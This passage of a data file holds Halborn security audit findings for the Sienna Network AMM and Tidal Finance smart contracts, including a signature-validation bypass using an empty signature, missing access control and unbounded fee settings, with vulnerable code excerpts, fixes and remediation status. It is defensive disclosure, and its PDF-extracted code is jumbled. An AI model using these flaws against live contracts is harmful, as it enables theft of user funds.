        "body": "ensure_correct_signature function in contracts/factory/src/contract.rs is the responsible to validate temporary signatures in factory contract and ensure the following scenarios: 1. Exchanges can be created by any user through create_exchange func- tion in factory contract. Other methods like initializing exchange contract directly would not work because of signature validation. 2. IDOs can be created by admin or whitelisted users through create_ido function in factory contract. Other methods like initializing ido contract directly would not work because of signature validation. 3. Launchpad can be created once (if it does not exist yet) by admin through create_launchpad function in factory contract. Other methods like initializing launchpad contract directly would not work because of signature validation. However, an attacker can completely bypass signature validation using '' (no space) as a signature because of incorrect use of unwrap_or_default This situation can produce the in ensure_correct_signature function. following consequences:  (Malicious) exchanges can be created with valid pair of tokens using register_exchange function in factory contract, which could be harm- ful for users because the creator of a fake exchange could completely withdraw tokens from the contract and steal users deposits.  Although these malicious exchanges would not appear directly in Sienna webpage because of filters used in their backend, they will appear as legitimate ones if other users query factory contract about existent exchanges using list_exchanges function. 13  On the other hand, once a (malicious) exchange is created with a specific pair of tokens, no one can create a valid exchange with those tokens anymore because they remain as already registered in factory contract storage.  Any user can create (malicious) IDOs using register_ido function in factory contract, completely bypassing admin / whithelisted user authorization checks. This newly created IDOs will appear as le- gitimate ones if other users query factory contract about existent IDOs using list_idos function.  Any user can create a (malicious) launchpad using register_launchpad function in factory contract, completely bypassing admin authoriza- tion check. This newly created launchpad will appear as legitimate one if other users query factory contract about launchpad address Besides, once the attacker using get_launchpad_address function. creates the (malicious) launchpad, admin will not be able to create a valid one. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 1: contracts/factory/src/contract.rs (Line 544) 543 fn ensure_correct_signature ( storage : & mut impl Storage , signature : Binary ) -> StdResult <() > { let stored_signature : Binary = load ( storage , EPHEMERAL_STORAGE_KEY ) ?. unwrap_or_default () ; if stored_signature ! = signature { return Err ( StdError :: unauthorized () ); } remove ( storage , EPHEMERAL_STORAGE_KEY ); Ok (() ) 544 545 546 547 548 549 550 551 552 553 } 14 Risk Level: Likelihood - 4 Impact - 5 Recommendation: Update the logic of ensure_correct_signature function to use ok_or_else instead of unwrap_or_default to recover stored signature. Remediation plan: SOLVED: The issue was fixed in commit b6290c639ba4ef02fea97313d5154e800b809cb0. 15 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "POSSIBILITY TO CREATE POOLS WITH THE SAME PAIR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "init function in contracts/exchange/src/contract.rs and create_exchange function in contracts/factory/src/contract.rs allow the possibility to create pools with the same pair, which generates unexpected situations, e.g.: a user could withdraw more tokens than his fair share and affect other users in the pool. This issue happens because when a pair is compared with another one, if their contract_addr are the same but their token_code_hash differ just in their upper / lower cases, these pairs will appear as different values. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 2: contracts/exchange/src/contract.rs (Line 53) deps : & mut Extern <S , A , Q >, env : Env , msg : InitMsg , 48 pub fn init < S: Storage , A : Api , Q: Querier >( 49 50 51 52 ) -> StdResult < InitResponse > { 53 54 55 56 57 return Err ( StdError :: generic_err ( if msg . pair .0 == msg . pair .1 { )); } \" Trying to create an exchange with the same token . \" , Listing 3: contracts/factory/src/contract.rs (Line 175) 169 pub fn create_exchange < S: Storage , A: Api , Q: Querier >( 170 171 deps : & mut Extern <S , A , Q >, env : Env , 16 pair : TokenPair < HumanAddr >, entropy : Binary , 172 173 174 ) -> StdResult < HandleResponse > { 175 if pair .0 == pair .1 { 176 177 178 179 )); } return Err ( StdError :: generic_err ( \" Cannot create an exchange with the same token . \" , Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update the logic of init and create_exchange functions to compare pairs only by their contract_addr value. Remediation plan: SOLVED: The issue was fixed in commit 57673cbe2aa9777b574095b2a68f8f7f4e792027. The Sienna.Network team updated the logic of PartialEq implementation for make comparisons of pairs only by contract_addr or denom values (depending on token type). libraries/amm-shared/src/token_type.rs TokenType in to 17 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "UNRESTRICTED CHANGES IN FEE RATES LEAD TO TOKENS LOSS / DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "init and set_config functions in contracts/factory/src/contract.rs change the values of all fields in ExchangeSettings directly, so do not restrict that values of swap_fee and sienna_fee are greater or equal than a maximum threshold. This situation can produce the following consequences:  A malicious (or compromised) admin can change temporarily sienna_fee to a very high value, e.g.: 99/100, and transfer all high commissions generated in swapping operations to his account (sienna_burner).  If total fee (swap_fee + sienna_fee) exceeds 1, swapping operations will always panic, thus generating a denial of service (DoS) in Sienna.Network protocol. Code Location: ExchangeSettings struct contains swap_fee and sienna_fee fields, whose type is Fee struct: Listing 4: libraries/amm-shared/src/exchange.rs (Lines 38,39) 37 pub struct ExchangeSettings <A > { 38 39 40 41 } pub swap_fee : Fee , pub sienna_fee : Fee , pub sienna_burner : Option <A >, 18 Fee struct represents a fraction with nom and denom fields: Listing 5: libraries/amm-shared/src/exchange.rs (Lines 73,74) 72 pub struct Fee { pub nom : u8 , 73 74 pub denom : u16 , 75 } init function calls from_init_msg function, which does not restrict that initial values of swap_fee and sienna_fee are greater or equal than a maximum threshold: Listing 6: contracts/factory/src/contract.rs (Line 46) let admin = msg . admin . clone () . unwrap_or ( env . message . sender ); save_admin ( deps , & admin ) ?; deps : & mut Extern <S , A , Q >, env : Env , msg : InitMsg , 37 pub fn init < S: Storage , A : Api , Q: Querier >( 38 39 40 41 ) -> StdResult < InitResponse > { 42 43 44 45 46 47 48 49 } Ok ( InitResponse :: default () ) save_prng_seed (& mut deps . storage , & msg . prng_seed ) ?; save_config ( deps , & Config :: from_init_msg ( msg )) ?; Listing 7: contracts/factory/src/state.rs (Line 48) pub fn from_init_msg ( msg : InitMsg ) -> Self { Self { 40 impl Config < HumanAddr > { 41 42 43 44 45 46 47 48 49 } snip20_contract : msg . snip20_contract , lp_token_contract : msg . lp_token_contract , pair_contract : msg . pair_contract , launchpad_contract : msg . launchpad_contract , ido_contract : msg . ido_contract , exchange_settings : msg . exchange_settings , 19 set_config function does not restrict that new values of swap_fee and sienna_fee are greater or equal than a maximum threshold: Listing 8: contracts/factory/src/contract.rs (Line 133) 132 133 134 if let Some ( new_value ) = exchange_settings { config . exchange_settings = new_value ; } Risk Level: Likelihood - 2 Impact - 5 Recommendation: Add a validation routine inside init and set_config functions to ensure that value of sienna_fee is lesser than a maximum threshold hardcoded in factory contract and total fee (swap_fee + sienna_fee) is lesser than 1. Remediation plan:: RISK ACCEPTED: The Sienna.Network team accepted the risk for this finding, also stated that if for whatever reason a mistake is made, it can quickly be corrected. 20 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "ADDING LIQUIDITY TO NEW POOLS DOES NOT WORK PROPERLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When users call add_liquidity function in contracts/exchange/src/con- tract.rs to add liquidity to new pools (i.e.: pools with no deposits), the assert_slippage_tolerance function is triggered and will always panic if slippage is specified at the beginning of the operation. This situation can produce the following consequences:  When legitimate users try to add liquidity to new pools, operations will always panic and make users spend transactions fees needlessly.  To force a new pool to work as expected, a user should transfer tokens directly to the pool without receiving LP tokens in return, and with the risk that another users benefit from his deposit.  The issues explained above will arise every time a new pool is created (or when its deposits become 0) and legitimate users try to add liquidity. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 9: contracts/exchange/src/contract.rs (Lines 723,727) 720 721 722 723 724 725 726 if decimal_math :: decimal_multiplication ( Decimal :: from_ratio ( deposits [0] , deposits [1]) , one_minus_slippage_tolerance , ) > Decimal :: from_ratio ( pools [0] , pools [1]) || decimal_math :: decimal_multiplication ( Decimal :: from_ratio ( deposits [1] , deposits [0]) , one_minus_slippage_tolerance , 21 727 728 729 730 731 732 { } ) > Decimal :: from_ratio ( pools [1] , pools [0]) return Err ( StdError :: generic_err ( \" Operation exceeds max slippage tolerance \" , )); Risk Level: Likelihood - 5 Impact - 2 Recommendation: Update the logic of assert_slippage_tolerance function to handle correctly the case where a pool has no deposits and slippage is specified as an argument of the function. Remediation plan: SOLVED: The issue was fixed in commit 55e2f9770584cecf06ee37d15c253900de1a1d48. 22 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "MAXIMUM THRESHOLD FOR SLIPPAGE IS NOT ENFORCED WHEN ADDING LIQUIDITY OR SWAPPING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When users add liquidity / swap and do not specify slippage tolerance (or its equivalent) in the operation, Sienna.Network AMM protocol does not enforce a default maximum threshold, which could severely affect users amount of tokens received in return. This issue can produce the following scenarios: Scenario #1: Adding liquidity  Someone creates a pool with 8000 token X and 2000 token Y, as a consequence, creator receives 4000 LP in return.  User A sends a transaction to provide liquidity of 80 token X and 20 token Y to the pool, so he expects to receive 40 LP in return.  However, some seconds before transaction of user A is processed, user B swaps 12000 token X to 1200 token Y. The final balance in the pool is: 20000 token X and 800 token Y.  When transaction of user A is processed, he receives 16 LP in return, instead of 40 LP he was expecting, i.e.: less than 50%. Scenario #2: Adding liquidity (imbalanced token pair) If a user mistakenly (or fooled by an attacker) provides liquidity with an imbalanced token pair, he could lose all his surplus of tokens. See the following example:  Someone creates a pool with 8000 token X and 2000 token Y, as a consequence, creator receives 4000 LP in return. 23  User A provides liquidity of 80 token X and 20 token Y to the pool, so he receives 40 LP in return.  User B provides liquidity of 80 token X and 2000 token Y, he also receives 40 LP in return, the same amount of LP tokens than previous transaction, but spending 100 times more token B. Scenario #3: Swapping  Someone creates a pool with 8000 token X and 2000 token Y.  User A sends a transaction to swap 100 token X and expects to receive ~25 token Y in return.  However, some seconds before transaction of user A is processed, user B swaps 12000 token X to 1200 token Y. The final balance in the pool is: 20000 token X and 800 token Y.  When transaction of user A is processed, he receives ~4 token Y in return, instead of ~25 token Y he was expecting, i.e.: less than 20% of expected value. Some recent DeFi attacks as occurred to BT.Finance or Saddle Finance show the importance to have a maximum predefined slippage to reduce the impact of tokens loss if unexpected situations appear or attackers compromise smart contracts in a platform. Code Location: When users add liquidity to a pool, assert_slippage_tolerance function will always return Ok(()) if slippage is not specified: Listing 10: contracts/exchange/src/contract.rs (Lines 712,713) 707 fn assert_slippage_tolerance ( 708 709 710 711 ) -> StdResult <() > { slippage : Option < Decimal >, deposits : &[ Uint128 ; 2] , pools : &[ Uint128 ; 2] , 24 712 713 714 if slippage . is_none () { return Ok (() ) ; } When users try to swap, swap function does not verify if difference between expected value and return value is within a default maximum threshold when expected_return is not specified in the operation: Listing 11: contracts/exchange/src/contract.rs (Line 461) 458 let settings = query_exchange_settings ( querier , config . factory_info . clone () ) ?; 459 460 461 462 463 464 465 466 467 let swap = do_swap ( querier , & config , & settings , & offer , false ) ?; if let Some ( expected_return ) = expected_return { if swap . result . return_amount . lt (& expected_return ) { return Err ( StdError :: generic_err ( \" Operation fell short of expected_return \" , )); } } Risk Level: Likelihood - 2 Impact - 4 Recommendation: Enforce the use of a default maximum threshold when users add liquidity or swap, but do not specify slippage tolerance or slippage value is greater than the threshold. As a reference, max slippage for Uniswap Pool and Uniswap Swap is 50%. 25 Remediation plan:: RISK ACCEPTED: The Sienna.Network team accepted the risk for this finding, also stated that the front-end already pre-calculates the expected_return parameter for swaps and they will also make changes for it to set the slippage tolerance for providing liquidity. 26 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An incorrect use of HandleMsg::Admin message in contracts/factory/src/- contract.rs can set admin of factory contract to an invalid address and inadvertently lose total control of this contract, which cannot be undone in any way. Currently, the admin of factory contract can change the admin address using the aforementioned message in a single transaction and without confirmation from the new address. Code Location: HandleMsg::Admin message in factory is routed to admin_handle function: Listing 12: contracts/factory/src/contract.rs (Line 78) 75 76 77 78 HandleMsg :: AddExchanges { exchanges } => add_exchanges ( deps , env , exchanges ) , HandleMsg :: AddIdos { idos } => add_idos ( deps , env , idos ) , HandleMsg :: AddLaunchpad { launchpad } => add_launchpad ( deps , env , launchpad ) , HandleMsg :: Admin ( msg ) => admin_handle ( deps , env , msg , AdminHandle ) , admin_handle function calls change_admin function: 13: Listing admin/src/admin.rs (Line 18) libraries/fadroma-21.07/scrt-admin/composable- 11 pub fn admin_handle < S: Storage , A: Api , Q: Querier >( 12 13 deps : & mut Extern <S , A , Q >, env : Env , 27 msg : AdminHandleMsg , handle : impl AdminHandle , 14 15 16 ) -> StdResult < HandleResponse > { 17 18 match msg { AdminHandleMsg :: ChangeAdmin { address } = > handle . change_admin ( deps , env , address ) } 19 20 } change_admin function saves the new admin address in a single transaction: Listing 14: admin/src/admin.rs (Line 40) libraries/fadroma-21.07/scrt-admin/composable- fn change_admin < S: Storage , A: Api , Q: Querier >( & self , deps : & mut Extern <S , A , Q >, env : Env , address : HumanAddr , ) -> StdResult < HandleResponse > { assert_admin ( deps , & env ) ?; save_admin ( deps , & address ) ?; 32 pub trait AdminHandle { 33 34 35 36 37 38 39 40 41 42 43 44 } } Ok ( HandleResponse :: default () ) Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split admin transfer functionality into set_admin and accept_admin functions. The latter function allows the transfer to be completed by the recipient. 28 Remediation plan: SOLVED: The issue was fixed in commit d92bf78c98f29c9eab73cf32a135ebb0600ffec4. 29 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "EXCHANGES MIGRATION MECHANISM IS NOT COMPLETE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When a new factory is deployed to replace an old one, it is mandatory to consider the following steps: 1. Exchanges be must contract. add_exchanges function in contracts/factory/src/contract.rs can be used by admin to complete this step. registered factory new the in 2. Factory address in all exchanges deployed must be updated; otherwise, changes in new factory (e.g.: fee rates) wont affect any exchange. Currently, there are no mechanisms in factory or exchange contracts to complete this step. Code Location: Listing 15: contracts/factory/src/contract.rs deps : & mut Extern <S , A , Q >, env : Env , exchanges : Vec < Exchange < HumanAddr >> , 441 #[ require_admin ] 442 fn add_exchanges < S : Storage , A: Api , Q: Querier >( 443 444 445 446 ) -> StdResult < HandleResponse > { 447 448 449 450 451 452 453 454 } messages : vec! [] , log : vec! [ log ( \" action \" , \" add_exchanges \")] , data : None , store_exchanges ( deps , exchanges ) ?; Ok ( HandleResponse { }) 30 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Update the exchanges migration mechanism to allow a mass migration pro- cess with security considerations, e.g.: restrict address that partici- pate in the migration, use temporary password, etc. It is also important that this mechanism updates factory address in all exchanges deployed. Remediation plan: SOLVED: The following commits fixed the security issue:  1eda85cae42125cc327691cc31e59728ecb4cfe0  43ead12b75aa74bf6cecd342d390206f63eea86f  6d08465d71364877e892a383a7d5f9bb51c2c272  835aed6b9c2ef76dc4abd90c2c7a1cbbe96fc5a8 31 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBILITY TO CREATE FAKE PAIRS WITH NATIVE COINS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An attacker can create a pool with a pair that contains a fake native token trying to imitate a real one, e.g.: denom in native token uses 'USCRT' / 'Uscrt' / 'uSCRT' / . . . as value instead of 'uscrt', as shown in the following example:  Token 1: { custom_token: {...} }  Token 2: { native_token: { denom: 'USCRT'} } This pool is created and will appear as a legitimate one in factory contract, and when users try to add liquidity to the pool, operations will always fail and make users spend transactions fees needlessly. This issue happens because generate_pair_key function in contracts/fac- tory/src/state.rs does not restrict that denom in native tokens use upper case letters. Code Location: Listing 16: contracts/factory/src/state.rs (Lines 290,295) 286 pub ( crate ) fn generate_pair_key ( pair : & TokenPair < CanonicalAddr >) -> Vec < u8 > { let mut bytes : Vec <&[ u8 ]> = Vec :: new () ; match & pair .0 { TokenType :: NativeToken { denom } => bytes . push ( denom . as_bytes () ) , TokenType :: CustomToken { contract_addr , .. } => bytes . push ( contract_addr . as_slice () ) , } match & pair .1 { TokenType :: NativeToken { denom } => bytes . push ( denom . 287 288 289 290 291 292 293 294 295 32 as_bytes () ) , TokenType :: CustomToken { contract_addr , .. } => bytes . push ( contract_addr . as_slice () ) , 296 297 } Risk Level: Likelihood - 3 Impact - 1 Recommendation: Update the logic of generate_pair_key function to throw an error message when denom in native tokens use upper case letters. Remediation plan: SOLVED: The issue was fixed in commit 0255154665c3b034bab328efb0abdb142adb4376. 33 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "PARTIALEQ FOR TOKENPAIR IS WRONGLY IMPLEMENTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "implementation The libraries/amm- shared/src/token_pair.rs makes wrong comparisons between two TokenPair, as shown in the following example: PartialEq TokenPair for of in Example of comparison: 1. pair = (A, B) 2. pair2 = (A, A) 3. When pair is compared against pair2, the test fails because the comparison concludes that values are different: 34 4. However, when pair2 is compared against pair, the test succeeds because the comparison wrongly concludes that values are equal: Although the vulnerability is not exploitable in current codebase, it is important to solve it because it is inside a library, and as such, it could be wrongly used in later iterations of the codebase and generates unexpected situations. Code Location: Listing 17: libraries/amm-shared/src/token_pair.rs (Line 80) 78 impl <A : PartialEq > PartialEq for TokenPair <A > { 79 80 fn eq (& self , other : & TokenPair <A >) -> bool { ( self .0 == other .0 || self .0 == other .1) && ( self .1 == other .0 || self .1 == other .1) } 81 82 } Risk Level: Likelihood - 1 Impact - 2 35 Recommendation: Update the implementation of PartialEq to make adequate comparisons be- tween TokenPair values. Below is a proposed sample code: Listing 18: Sample code for TokenPair comparison 1 impl <A : PartialEq > PartialEq for TokenPair <A > { 2 3 fn eq (& self , other : & TokenPair <A >) -> bool { ( self .0 == other .0 && self .1 == other .1) || ( self .0 == other .1 && self .1 == other .0) } 4 5 } Remediation plan: SOLVED: The issue was fixed in commit 9826e90b55961f18c47ed355d7b2fe9c07190739. 36 3.10 (HAL-10) SPREAD AMOUNT IS CALCULATED BUT NOT USED - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "EXPERIMENTAL FEATURES ENABLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf",
        "body": "ABIEncoderV2 is enabled to be able to pass struct type into a function both web3 and another contract. The use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(. . . ) as arguments in external function calls or in event data without prior assignment to The types a local variable. bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Using return does not trigger the bug. Furthermore, arrays with elements shorter than 32 bytes may not be handled correctly even if the base type is an integer type. Encoding such arrays in the way described above can lead to other data in the encoding being overwritten if the number of elements encoded is not a multiple of the number of elements that fit a single slot. If nothing follows the array in the encoding (note that dynamically-sized arrays are always encoded after statically-sized arrays with statically-sized content), or if only a single array is encoded, no other data is overwritten. There are known bugs that are publicly released while using this feature. However, the bug only manifests itself when all the following conditions are met:  Storage data involving arrays or structs is sent directly to an external function call, to abi.encode or to event data without prior assignment to a local (memory) variable.  There is an array that contains elements with size less than 32 bytes or a struct that has elements that share a storage slot or members of type bytesNN shorter than 32 bytes. In addition to that, in the following situations, your code is NOT affected:  All the structs or arrays only use uint256 or int256 types. If you 14 only use integer types (that may be shorter) and only encode at most one array at a time. If you only return such data and do not use it in abi.encode, external calls or event data. Reference: https://blog.ethereum.org/2019/03/26/solidity-optimizer-and- abiencoderv2-bug/ ABIEncoderV2 is enabled to be able to pass struct type into a function both web3 and another contract. Naturally, any bug can have wildly varying consequences depending on the program control flow, but we expect that this is more likely to lead to malfunction than exploitation. The bug, when triggered, will under certain circumstances send corrupt parameters on method invocations to other contracts. Code Location: GovernorAlpha.sol Line #14 Listing 1: GovernorAlpha.sol (Lines 15) 14 pragma solidity 0.6.12; 15 pragma experimental ABIEncoderV2 ; Staking.sol Line #3 Listing 2: Staking.sol (Lines 3) 3 pragma solidity 0.6.12; 4 pragma experimental ABIEncoderV2 ; Risk Level: Likelihood - 2 Impact - 2 15 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). Remediation Plan: RISK ACCEPTED: Tidal.Finance accepts the use of ABIEncoderV2 in view functions and for parsing structured data. 16 ",
        "labels": [
            "Halborn",
            "Tidal_Finances",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ACCESS CONTROL ON THE TRUSTED FORWARDER FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf",
        "body": "During the tests, It has been observed that, only owner check is missing on the setTrustedForwarder function. Code Location: Registry.sol Line #123 Listing 3: Registry.sol (Lines 123) 123 124 125 function setTrustedForwarder ( address trustedForwarder_ ) external { trustedForwarder = trustedForwarder_ ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to implement access control in that function. Remediation Plan: SOLVED: Tidal.Finance implemented access control in setTrustedForwarder function in commit b7dae61079b1dddd913b819ace516b9f0fd83a92. 17 ",
        "labels": [
            "Halborn",
            "Tidal_Finances",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENT HANDLER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the Registry.sol contract the function does not emit event after the Events are a method of informing the transaction initiator progress. It logs its emitted about the actions taken by the called function. parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: Registry.sol Line #~46-125 Listing 4: Registry.sol (Lines ) 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 function setTimeExtra ( uint256 timeExtra_ ) function setBuyer ( address buyer_ ) function setSeller ( address seller_ ) function setGuarantor ( address guarantor_ ) function setStaking ( address staking_ ) function setBonus ( address bonus_ ) function setTidalToken ( address tidalToken_ ) function setBaseToken ( address baseToken_ ) function setAssetManager ( address assetManager_ ) function setPremiumCalculator ( address premiumCalculator_ ) function setPlatform ( address platform_ ) function setGuarantorPercentage ( uint256 percentage_ ) function setPlatformPercentage ( uint256 percentage_ ) function setGovernor ( address governor_ ) function setCommittee ( address committee_ ) function setTrustedForwarder ( address trustedForwarder_ ) Risk Level: Likelihood - 2 Impact - 2 18 Recommendation: Consider declaring events at the end of function. Events can be used to detect the end of the operation. Remediation Plan: RISK ACCEPTED: Tidal.Finance considers it to be appropriate not declaring these events because most of these functions will be called only once. 19 ",
        "labels": [
            "Halborn",
            "Tidal_Finances",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the BaseRelayRecipient.sol,the contract uses the floating pragma Contracts should be deployed with the same compiler version ^0.6.12. and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Reference: ConsenSys Diligence - Lock pragmas Code Location: BaseRelayRecipient Line #2 Listing 5: BaseRelayRecipient.sol (Lines 1) 1 pragma solidity ^0.6.12;  This is an example where the floating pragma is used. ^0.6.12. Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider locking the pragma version. It is recommended not to use floating pragma in production. Apart from just locking the pragma version in the code, the sign (>=) need to be removed. It is possible to lock the pragma version both in truffle-config.js and in hardhat.config.js if you use HardHat framework for the deployment. 20 Remediation Plan: SOLVED: Tidal.Finance locked the pragma version (0.6.12) in commit 6 ba4efc80292769ebd8a36d3ade87b7ac5bb6ea0. 21 ",
        "labels": [
            "Halborn",
            "Tidal_Finances",
            "Severity: Low"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf",
        "body": "The Owner of the contract is usually the account which deploys the contract. As a result, the Owner is able to perform some privileged actions. In the smart contracts, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. All contracts are affected which is derived from Ownable contract. Code Location: PremiumCalculator.sol Line #11 Bonus.sol Line #18 AssetManager.sol Line #9 Registry.sol Line #8 CommitteeAlpha.sol Line #18 Buyer.sol Line #22 Staking.sol Line #18 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. 22 Listing 6: Disable RenounceOwnerShip (Lines 1) 1 2 3 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } Remediation Plan: to ACKNOWLEDGED: multi-signature wallet or DAO will indirectly control it. Tidal.Finance transfer Owners will Timelock and 23 ",
        "labels": [
            "Halborn",
            "Tidal_Finances",
            "Severity: Low"
        ]
    },
    {
        "title": "INFINITE MINTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf",
        "body": "During the test, it has been observed that an attacker could mint any amount of USDC. Although, the comment is written on the top of the code, the code should be deleted from the repository. Code Location: MockUSDC.sol Line #3 Listing 7: MockUSDC.sol (Lines 45) 44 45 46 47 // For test purpose . function mint ( uint256 amount_ ) external { _mint ( msg . sender , amount_ ); } Recommendation: It is recommend to delete related code from the repository. Remediation Plan: NOT APPLICABLE: Tidal.Finance claims that MockUSDC.sol file is for testing purposes only and will never be used in production. 24 ",
        "labels": [
            "Halborn",
            "Tidal_Finances",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE OF INLINE ASSEMBLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf",
        "body": "Inline assembly is a way to access the Virtual Machine at a low level. This discards several important safety features in Solidity. Code Location: GovernanceToken.sol Line #248 GovernorAlpha.sol Line #39 StakingHelper.sol Line #20 Listing 8: GovernanceToken.sol (Lines ) 248 249 250 251 252 constructor () public { uint chainId ; assembly { chainId := chainid } Listing 9: BaseRelayRecipient.sol (Lines ) 35 function _msgSender () internal override virtual view returns ( address payable ret ) { 36 37 38 39 40 41 42 43 44 if ( msg . data . length >= 24 && isTrustedForwarder ( msg . sender )) { // At this point we know that the sender is a trusted forwarder , // so we trust that the last bytes of msg . data are the verified sender address . // extract sender address from the end of msg . data assembly { ret := shr (96 , calldataload ( sub ( calldatasize () ,20) ) ) } } else { return msg . sender ; 25 45 46 } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: The contracts should avoid using inline assembly because it interacts with the EVM (Ethereum Virtual Machine) at a low level. An attacker could bypass many essential safety features of Solidity. Remediation Plan: RISK ACCEPTED: Tidal.Finance assumes the risk because the use of assembly is needed. 26 ",
        "labels": [
            "Halborn",
            "Tidal_Finances",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf",
